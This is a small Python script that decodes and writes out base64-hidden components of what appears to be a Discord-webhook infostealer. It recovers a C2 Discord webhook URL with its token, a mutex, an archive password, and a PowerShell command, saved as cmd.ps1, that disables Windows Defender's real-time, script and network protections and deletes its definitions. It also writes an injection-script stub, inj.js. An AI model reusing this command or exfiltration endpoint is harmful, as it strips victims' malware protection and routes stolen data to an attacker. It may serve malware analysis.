import base64

class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2OTcxNjQ3NTg1NDQ1ODkzMi9DM2Uzd2NxdU1QVjBOenYtZC1ZQzJFY0RWc1h0blBvXzBXRGpLT1VuVlBtakNvZ2lxUFNjUnV0UXZTVFplUlJGNVI0cA==').decode())
    Mutex = base64.b64decode('Z1F4VFExUlY1eWlLMWNDTQ==').decode()
    ArchivePassword = base64.b64decode('eQ==').decode()

command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')

code = base64.b64decode(b'').decode(errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))

with open(f"info.txt", 'w', encoding='utf-8-sig') as file:
    a=None
    a=f"C2: \n{Settings.C2}\n"
    a+=f"\n\nMutex: \n{Settings.Mutex}\n"
    a+=f"\n\nArchive Password: \n{Settings.ArchivePassword}\n"
    file.write(a)

with open(f"cmd.ps1", 'w', encoding='utf-8-sig') as file:
    file.write(command)

with open(f"inj.js", 'w', encoding='utf-8-sig') as file:
    file.write(code)
